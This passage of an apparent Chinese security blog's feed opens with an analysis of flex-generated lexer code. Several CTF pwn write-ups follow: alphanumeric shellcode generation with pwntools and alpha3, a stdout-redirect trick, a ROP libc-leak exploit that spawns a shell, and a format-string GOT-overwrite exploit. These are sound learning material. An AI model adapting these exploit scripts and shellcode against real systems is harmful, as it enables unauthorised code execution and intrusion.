class="number">1</span>, max_size, yyin))==<span class="number">0</span> &amp;&amp; ferror(yyin)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>( errno != EINTR) </span><br><span class="line">&#123; </span><br><span class="line">YY_FATAL_ERROR( <span class="string">"input in flex scanner failed"</span> ); </span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line">clearerr(yyin); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上述 C 代码十分复杂，我们也可以将此宏修改成如下形式</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line">    <span class="keyword">if</span> ( (result = fread( (<span class="keyword">char</span>*)buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), max_size, fin)) &lt; <span class="number">0</span>) </span><br><span class="line">        YY_FATAL_ERROR( <span class="string">"read() in flex scanner failed"</span>);</span><br></pre></td></tr></table></figure><h2 id="DFA状态转移表分析"><a href="#DFA状态转移表分析" class="headerlink" title="DFA状态转移表分析"></a>DFA状态转移表分析</h2><h3 id="未压缩状态矩阵"><a href="#未压缩状态矩阵" class="headerlink" title="未压缩状态矩阵"></a>未压缩状态矩阵</h3><p>以下是<strong>经过压缩</strong>的状态转移矩阵.其实 flex 在默认的情况下,会输出压缩版本的状态转移矩阵,因为完整版本的矩阵是 Nx128 大小(其中N是自动机的状态数，128 则是字符集大小如果不经压缩的话,会带来不必要的空间开销。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_accept[6]</span><br><span class="line">static yyconst YY_CHAR yy_ec[256]</span><br><span class="line">static yyconst YY_CHAR yy_meta[2]</span><br><span class="line">static yyconst flex_uint16_t yy_base[7]</span><br><span class="line">static yyconst flex_int16_t yy_def[7]</span><br><span class="line">static yyconst flex_uint16_t yy_nxt[5]</span><br><span class="line">static yyconst flex_int16_t yy_chk[5]</span><br></pre></td></tr></table></figure><p>以下是未经过压缩的状态转移矩阵。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_nxt[][128] &#x3D; &#123;...&#125;</span><br><span class="line">static yyconst flex_int16_t yy_accept[..] &#x3D; &#123;...&#125;</span><br></pre></td></tr></table></figure><ul><li>yy_accept 是 accept 的状态</li><li>yy_nxt 是状态跳转表</li></ul><p>有了状态转移表，接下来的关键问题就是如何使用它。这里我们就要参考词法分析函数的实现函数—— <code>yylex()</code>的具体实现了。</p><p>在 flex 所生成的代码中，连这个函数的定义语句都被define成<code>YY_DECL</code>：<code>#define YY_DECL int yylex (void)</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** The main scanner function which does all the work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">YY_DECL</span><br><span class="line">&#123;</span><br><span class="line">    yy_state_type yy_current_state;</span><br><span class="line">    <span class="keyword">char</span> *yy_cp, *yy_bp;</span><br><span class="line">    <span class="keyword">int</span> yy_act;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( !(yy_init) )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_init) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! (yy_start) )</span><br><span class="line">            (yy_start) = <span class="number">1</span>; <span class="comment">// 初始状态定义</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 设置文件输入、输出指针 */</span></span><br><span class="line">        <span class="keyword">if</span> ( ! yyin )</span><br><span class="line">            yyin = <span class="built_in">stdin</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! yyout )</span><br><span class="line">            yyout = <span class="built_in">stdout</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 对非owner的buffer使用stack方式管理*/</span></span><br><span class="line">        <span class="keyword">if</span> ( ! YY_CURRENT_BUFFER ) &#123;</span><br><span class="line">            yyensure_buffer_stack ();</span><br><span class="line">            YY_CURRENT_BUFFER_LVALUE =</span><br><span class="line">                yy_create_buffer(yyin,YY_BUF_SIZE );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        yy_load_buffer_state( );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )        </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 设置各种buffer处的指针，以便在匹配成功时，通过yytext获取对应字符串</span></span><br><span class="line">        <span class="comment">/*此指针指向上一字符*/</span></span><br><span class="line">        yy_cp = (yy_c_buf_p);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Support of yytext. */</span></span><br><span class="line">        <span class="comment">/*此指针不断指向要读入的字符,将会在状态跳转中不断更新*/</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* yy_bp points to the position in yy_ch_buf of the start of</span></span><br><span class="line"><span class="comment">         * the current run.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        yy_bp = yy_cp;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 默认从start状态开始</span></span><br><span class="line">        yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line">        <span class="comment">// 开始进行状态转移, 通过yy_nxt表，结合yy_current_state和当前读入的字符来索引跳转状态, 直到无法转移</span></span><br><span class="line">        <span class="comment">// 根据当前状态，以及下一个字符，来进行转移</span></span><br><span class="line">        <span class="keyword">while</span> ( (yy_current_state = yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">                &#123;</span><br><span class="line">                (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">                (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">                &#125;</span><br><span class="line">            ++yy_cp;</span><br><span class="line"> &#125;</span><br><span class="line">        yy_current_state = -yy_current_state;</span><br><span class="line"> </span><br><span class="line">yy_find_action:</span><br><span class="line">        <span class="comment">// 状态转移完了，查看转移后的状态是否出于可接受状态</span></span><br><span class="line">        yy_act = yy_accept[yy_current_state];</span><br><span class="line"> </span><br><span class="line">        YY_DO_BEFORE_ACTION;</span><br><span class="line"> </span><br><span class="line">do_action:    <span class="comment">/* 这里主要是处理读取到EOF的情况. */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span> ( yy_act )    &#123; <span class="comment">/* beginning of action switch */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// yy_accept中值为1为接受状态，其他状态不合法 </span></span><br><span class="line">        &#123;<span class="keyword">return</span> <span class="literal">true</span> ;&#125;</span><br><span class="line">        YY_BREAK</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">YY_STATE_EOF</span><span class="params">(INITIAL)</span>:</span></span><br><span class="line"><span class="function">        <span class="title">yyterminate</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> YY_END_OF_BUFFER:</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">/* Amount of text matched not including the EOB char. */</span></span><br><span class="line">        <span class="keyword">int</span> yy_amount_of_matched_text = (<span class="keyword">int</span>) (yy_cp - (yytext_ptr)) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 还原YY_DO_BEFORE_ACTION做出的变动</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line">        YY_RESTORE_YY_MORE_OFFSET</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 调整buffer，其中有对EOB的不同情况的处理等等</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        YY_FATAL_ERROR(<span class="string">"fatal flex scanner internal error--no action found"</span> );</span><br><span class="line">        &#125; <span class="comment">/* end of action switch */</span></span><br><span class="line">    &#125; <span class="comment">/* end of scanning one token */</span></span><br><span class="line">    &#125; <span class="comment">/* end of user's declarations */</span></span><br><span class="line">&#125; <span class="comment">/* end of yylex */</span></span><br></pre></td></tr></table></figure><p>我们从中可以看出，<strong>1</strong> 是我们起始状态的起点,在进行正则匹配的时候，我们从这个状态开始不断的读入字符，不断的进行状态转移，最终会停在某个节点。此时我们就会判断当前状态对应的数值,如果是 <strong>1</strong> 则表示 accept 状态，如果不是则为非法的，这里面的两个 <code>1</code> <strong>含义完全不同</strong>：前者是状态的标识，后者则是标志某个状态是否是接受状态。</p><p>上面的 DFA 伪代码可以抽象成</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">state= <span class="number">0</span>; </span><br><span class="line"><span class="built_in">get</span> next input character</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">not</span> <span class="built_in">end</span> of input) &#123;</span><br><span class="line">    depending on current state <span class="keyword">and</span> input character</span><br><span class="line">        match: <span class="comment">/* input expected */</span></span><br><span class="line">            calculate <span class="keyword">new</span> state; <span class="built_in">get</span> next input character</span><br><span class="line">        accept: <span class="comment">/* current pattern completely matched */</span></span><br><span class="line">            state= <span class="number">0</span>; perform action corresponding to pattern</span><br><span class="line">        error: <span class="comment">/* input unexpected */</span></span><br><span class="line">            state= <span class="number">0</span>; echo <span class="number">1</span>st character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">            reset input to <span class="number">2</span>nd character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结就是从开始状态开始，读取字符并结合状态跳转表来进行状态跳转，当无法继续跳转的时候或字符已经读取完成,此时判断是否是 accept 的状态，并执行用户定义的规则代码。</p><h3 id="压缩状态矩阵"><a href="#压缩状态矩阵" class="headerlink" title="压缩状态矩阵"></a>压缩状态矩阵</h3><p>状态跳转表以及accept表如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_accept[<span class="number">10</span>]</span><br><span class="line">yyconst YY_CHAR yy_ec[<span class="number">256</span>]</span><br><span class="line">yyconst YY_CHAR yy_meta[<span class="number">7</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_base[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_def[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_nxt[<span class="number">19</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_chk[<span class="number">19</span>]</span><br></pre></td></tr></table></figure><p>而此时 match 中的代码就会变为</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">register</span> YY_CHAR yy_c = yy_ec[YY_SC_TO_UI(*yy_cp)] ;</span><br><span class="line">    <span class="comment">// 这个if语句就不影响状态转移，只是为了记录状态</span></span><br><span class="line">    <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">        (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )</span><br><span class="line">        &#123;</span><br><span class="line">        yy_current_state = (<span class="keyword">int</span>) yy_def[yy_current_state];</span><br><span class="line">        <span class="comment">// 注意这个22是Magic Number，随accept数量变化</span></span><br><span class="line">        <span class="keyword">if</span> ( yy_current_state &gt;= <span class="number">22</span> )</span><br><span class="line">            yy_c = yy_meta[(<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">        &#125;</span><br><span class="line">    yy_current_state = yy_nxt[yy_base[yy_current_state] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">    ++yy_cp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 这个43也是Magic Number</span></span><br><span class="line"><span class="keyword">while</span> ( yy_base[yy_current_state] != <span class="number">43</span> );</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从生成代码中我们<strong>最需要知道</strong>的就是：DFA 的状态转移图(以矩阵的形式体现出来),以及理解如何使用状态转移图的,也就是理解 <code>yylex()</code> 函数的具体实现,它其中定义了各个状态的含义。那么从代码中我们也能知道<code>yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]</code>中 yy_nxt 就是我们的状态跳转表，YY_SC_TO_UI 能够将我们的字符转成相应的 ascii，yy_cp 指针指向我们要读取的字符。这样我们的矩阵抽象出来就是我们的每一行代表的是我们的状态，每一列代表的是我们的字符转成ascii后的无符号整数。<strong>一句话概括就是现实生活中的查表</strong>。</p><p>例如一个规则表达式 <code>a(b|c)d*e+</code>，其状态可由下图表示</p><p><img src="/" alt="image-20200625220424190.png" class="lazyload" data-src="https://i.loli.net/2020/06/25/4iISH2a3tJGZToc.png"></p><p>会产生如下状态表</p><p><img src="/" alt="image-20200625220612068.png" class="lazyload" data-src="https://i.loli.net/2020/06/25/ysTpxdPSIjnKCoB.png"></p><ul><li><p>a 表示 accept 状态</p></li><li><p>m(N) 表示跳转到 N 状态</p></li><li><p>空白处则为 error</p></li></ul><p>基本上 flex 生成的代码还是通过匹配循环来实现<code>规则-&gt;行为</code>的模式，不断的调用 yylex 来匹配输出相应的 token。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://tina2114.github.io/2020/06/16/lexer代码骨架整理/#more" target="_blank" rel="noopener">https://tina2114.github.io/2020/06/16/lexer%E4%BB%A3%E7%A0%81%E9%AA%A8%E6%9E%B6%E6%95%B4%E7%90%86/#more</a></p><p><a href="https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer分析/" target="_blank" rel="noopener">https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer%E5%88%86%E6%9E%90/</a></p><p><a href="https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1" target="_blank" rel="noopener">https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1</a></p><p><a href="https://blog.finaltheory.me/research/Flex-Tricks.html#b129e" target="_blank" rel="noopener">https://blog.finaltheory.me/research/Flex-Tricks.html#b129e</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;flex生成代码分析&quot;&gt;&lt;a href=&quot;#flex生成代码分析&quot; class=&quot;headerlink&quot; title=&quot;flex生成代码分析&quot;&gt;&lt;/a&gt;flex生成代码分析&lt;/h2&gt;&lt;p&gt;本文从flex源码入手分析flex框架。&lt;/p&gt;
&lt;p&gt;flex会根据我们所
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>关于纯字符shellcode的编写</title>
    <link href="https://billyotry.github.io/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>https://billyotry.github.io/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</id>
    <published>2020-04-14T15:32:55.317Z</published>
    <updated>2020-06-29T01:50:25.775Z</updated>
    
    <content type="html"><![CDATA[<p>在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。<strong>在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！</strong>具体参考TaQini师傅的文章</p><p><a href='http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode' target="_blank" rel="noopener">纯字符shellcode生成指南</a></p><p>关键部分:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; len) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'a'</span>) || (<span class="string">'z'</span> &lt; (<span class="keyword">char</span>)buf[i])) &amp;&amp;</span><br><span class="line">          (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'A'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) &amp;&amp;</span><br><span class="line">         (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'0'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I Can\'t Read This!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf();     <span class="comment">//可以看到程序会将我们的输入当成函数执行</span></span><br></pre></td></tr></table></figure><p>我们可以使用alpha3来将pwntools生成shellcode来转为alphanumeric shellcode.</p><p><code>1.python ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</code></p><p>在使用这条命令前我们还需要有pwntools生成的shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename  sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> str(shellcode)</span><br></pre></td></tr></table></figure><p>如何将文件的输出输出到sc文件中(不能输出到终端复制过去,有不可见字符)</p><p><code>2.python sc.py &gt; sc</code></p><p>然后我们就可以用1命令生成alphanumeric shellcode(这里的shellcode是会输出的终端,如果你想输出到文件中的话可以去翻官方文档)        ——-&gt;         <a href='https://github.com/SkyLined/alpha3 ' target="_blank" rel="noopener">alpha3</a></p><p><img src="/" alt="QQ图片20200415000820.png" class="lazyload" data-src="https://i.loli.net/2020/04/15/Wi9Jhe4L1NdfDwq.png"></p><p>   Note:这里要还有要注意一个寄存器的问题,因为这里buf函数是<code>call rax</code>所以我们的1命令中使用<code>rax</code>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。&lt;strong&gt;在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！&lt;/strong&gt;具体参考TaQini师傅的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[WUSTCTF]closed</title>
    <link href="https://billyotry.github.io/2020/04/14/[WUSTCTF]closed/"/>
    <id>https://billyotry.github.io/2020/04/14/[WUSTCTF]closed/</id>
    <published>2020-04-14T03:24:58.363Z</published>
    <updated>2020-04-14T16:17:34.955Z</updated>
    
    <content type="html"><![CDATA[<p>标准输出流全关了，需要将<code>stdout</code>重定向到<code>stdin</code>就行了。</p><p><code>cat flag &gt;&amp;0</code> 或 <code>exec 1&gt;&amp;0</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标准输出流全关了，需要将&lt;code&gt;stdout&lt;/code&gt;重定向到&lt;code&gt;stdin&lt;/code&gt;就行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt; 或 &lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[HarekazeCTF2019]baby_rop2</title>
    <link href="https://billyotry.github.io/2020/04/05/[HarekazeCTF2019]baby_rop2/"/>
    <id>https://billyotry.github.io/2020/04/05/[HarekazeCTF2019]baby_rop2/</id>
    <published>2020-04-05T09:30:46.507Z</published>
    <updated>2020-04-05T09:45:15.087Z</updated>
    
    <content type="html"><![CDATA[<p>ida,checksec,F5三连。</p><p><img src="/" alt="QQ图片20200405170524.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/5apPnyXTNwvJV3C.png"></p><img src="/" alt="QQ图片20200405165940.png" style="zoom: 50%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/bjnJQi1MAlfkHgu.png"><img src="/" alt="QQ图片20200405170003.png" style="zoom: 67%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/F8Hd9licxIUzNsp.png"><p>很简单的ROP，利用printf函数泄露出地址就行。</p><p>但是这道题一开始我没做出来是因为我忘了<strong>printf函数泄露地址里面是要有%s参数的</strong>。(可能是puts的题目做习惯了)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./babyrop2')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28010</span>)</span><br><span class="line">elf = ELF(<span class="string">'babyrop2'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0x123</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>Note:这里用有个r15是因为用ROPgadget查看发现gadget是这样的：</p><p><img src="/" alt="QQ图片20200405170950.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/2MaTJgPRySKrm5Y.png"></p><p>所以这里的r15不用管，随便填就行了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ida,checksec,F5三连。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;QQ图片20200405170524.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net/2020/04/05/5apPnyXTNwvJ
      
    
    </summary>
    
    
      <category term="BUUOJ" scheme="https://billyotry.github.io/categories/BUUOJ/"/>
    
    
  </entry>
  
  <entry>
    <title>[BJD2nd]r2t4</title>
    <link href="https://billyotry.github.io/2020/03/23/[BJD2nd]r2t4/"/>
    <id>https://billyotry.github.io/2020/03/23/[BJD2nd]r2t4/</id>
    <published>2020-03-23T12:49:53.321Z</published>
    <updated>2020-04-27T13:08:55.252Z</updated>
    
    <content type="html"><![CDATA[<p>第一步当然就是日常查保护啦！</p><p>会看到堆栈不可执行还有NX保护</p><p><img src="/" alt="image-20200323213631230.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png"></p><p>然后就丢进IDA，F5</p><p><img src="/" alt="image-20200323214009122.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/N7gIPZSzXCDVjsv.png"></p><p><img src="/" alt="image-20200323214325901.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/8djRsrFqJOf93mx.png"></p><p>很明显的格式化字符串，发现出题人还留了后门函数，但是这个backdoor这个英语给我整笑了。这里一开始的思路是利用栈溢出泄露canary出来后然后填在ebp-8的位置上绕过栈保护，再控制程序流程去执行后门函数。想了半天也不知道为什么，调试程序的时候发现他只有一次输入一次输入，就是说泄露的canary之后没法再把payload输进去，想了半天都不知道怎么办，甚至还一度的怀疑是出题人出错了。</p><p>后来想到了这里并不能通过格式化泄露canary来绕过栈保护，而是进入任意地址写，将后门函数写进返回地址里面，又做了好久依旧没有打通，后来经过1p0ch师傅的指点，这里应该要将后门函数写到stack_chk_fail里面。我们知道当canary被修改了之后，会触发stack_chk_fail函数，所以可以利用这一点。(不过这种操作也是第一次听说，学到了)。</p><p>接下来先看下偏移是多少</p><p><img src="/" alt="image-20200323220148164.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/aJWXOuUT9jMkFlg.png"></p><p>很明显看到偏移是6</p><p>那么我们接下来就可以写exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./r2t4'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">stack_addr=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%1574c%8$hnaaaaa'</span>+p64(`stack_addr)+<span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1574是0x626是十进制</p><p>这里偏移为8是因为’%1574c%8’为偏移6，’$hnaaaaa’为偏移7，那么要写入的p64(stack_addr)就是偏移8了。后面的aaaaa是为了对齐地址。</p><p>这里为了触发__stack_chk_fail，payload的长度就要是0x30,也就是48.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;第一步当然就是日常查保护啦！&lt;/p&gt;
&lt;p&gt;会看到堆栈不可执行还有NX保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;image-20200323213631230.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
